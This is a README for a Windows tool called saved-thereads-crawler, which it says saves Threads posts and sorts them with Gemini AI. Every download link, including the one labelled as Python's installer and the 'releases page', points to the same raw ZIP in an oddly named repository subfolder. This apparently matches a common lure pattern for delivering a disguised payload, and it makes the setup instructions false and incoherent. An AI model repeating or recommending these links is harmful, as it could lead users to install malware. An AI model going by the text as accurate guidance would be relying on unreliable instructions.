# 🧵 saved-thereads-crawler - Save and Organize Threads Easily

[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)

## 📋 What is saved-thereads-crawler?

saved-thereads-crawler is a simple tool that automatically collects the posts you saved on Threads. It uses AI to sort these posts into categories and saves them in clean Markdown files with images. This tool is designed to help you keep your favorite Threads content organized on your computer.

You do not need programming skills to use this. It runs on Windows and works by downloading your saved posts, sorting them, and saving them so you can read or share later.

---

## ⚙️ Features

- **Automatic collection** of your saved Threads posts.
- Uses AI to sort posts into five categories: Information, Wisdom, Tech, News, Life.
- Saves images from posts to your computer.
- Avoids duplicates by skipping posts you already saved.
- Cleans up text by removing extra interface messages and repeated comments.
- Automatically renames files for easy recognition.
- Creates an index file that lists all saved posts by category.

---

## 💻 Requirements

- Windows 10 or newer.
- Python 3.9 or higher installed (easy to get from python.org).
- Internet connection to download posts and AI categories.
- A Google Gemini API key (required for AI sorting; please check their service for setup).
- Enough disk space depending on how many posts and images you save.

---

## 🚀 Getting Started: Download and Install

### Step 1: Download the Program

Click this big button to open the releases page where you can get the latest version for Windows:

[![Download](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)

On the releases page, look for the Windows installer or ZIP file. Usually, it will be marked with `.exe` or `.zip`. Download the file to a folder you can remember.

---

### Step 2: Install Python (if not installed)

1. Go to https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip  
2. Download the latest version of Python 3.9 or higher (choose the executable installer).  
3. Run the installer and **make sure** to check "Add Python to PATH" during setup.  
4. Complete the installation wizard.

---

### Step 3: Prepare the saved-thereads-crawler Folder

- If you downloaded a ZIP file, right-click it and choose **Extract All...** to unzip it.
- You should now have a folder named `saved-thereads-crawler` with files inside.

---

### Step 4: Set Up the API Key

1. Obtain your Google Gemini API key by signing up at Google’s official API portal.
2. Inside the `saved-thereads-crawler` folder, find the configuration file named `config.ini` or similar.
3. Open it with Notepad.
4. Enter your API key in the designated line, save, and close the file.

---

## 🛠 Running the Program

### Step 1: Open Command Prompt

- Press the Windows key.
- Type `cmd` and press Enter.
- A black window called Command Prompt will open.

---

### Step 2: Change Directory to the Program Folder

Type this command and press Enter:

```bash
cd path\to\saved-thereads-crawler
```

Replace `path\to\saved-thereads-crawler` with the path to where you saved the folder  
For example:

```bash
cd C:\Users\YourName\Downloads\saved-thereads-crawler
```

---

### Step 3: Install Required Python Packages 

In the Command Prompt, type the following and press Enter:

```bash
pip install -r requirements.txt
```

This downloads and installs all needed Python software for the program to work.

---

### Step 4: Start the Crawler

Type this command and press Enter:

```bash
python main.py
```

The program will log into Threads using Playwright, collect your saved posts, sort them with Gemini AI, and save the results with images in Markdown format. It will also update an index of all your saved posts.

---

## 📂 Where To Find Your Saved Posts

All saved posts and images will be placed inside the `output` folder within the program’s main folder. You can open the `index.md` file there to see all your posts grouped by category.

---

## 🔄 Running the Program Again

Each time you run the crawler, it will check for new saved posts and skip any you already saved. This prevents duplicates. You can run it anytime you want to update your collection.

---

## ⚙️ Common Tasks

### Update the Program

1. Visit the releases page:  
   https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip  
2. Download the latest version.  
3. Replace old files with new ones.

---

### Troubleshooting

- If you see an error about Python not found, make sure you installed Python and added it to PATH.
- If the program stops or has login issues, your Threads login session may have expired. Re-login or check your internet connection.
- For issues with the API key, confirm your key is correct and active.

---

## 📆 Program Features and Benefits Recap

- Easy access to your saved Threads posts in Markdown format.
- Automatic sorting by topic thanks to AI.
- Image collection included.
- Avoid duplicate files.
- Clean and readable saved content.
- Organized index file for quick browsing.

---

[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kowshik1302/saved-thereads-crawler/raw/refs/heads/main/silverly/thereads_saved_crawler_v1.0.zip)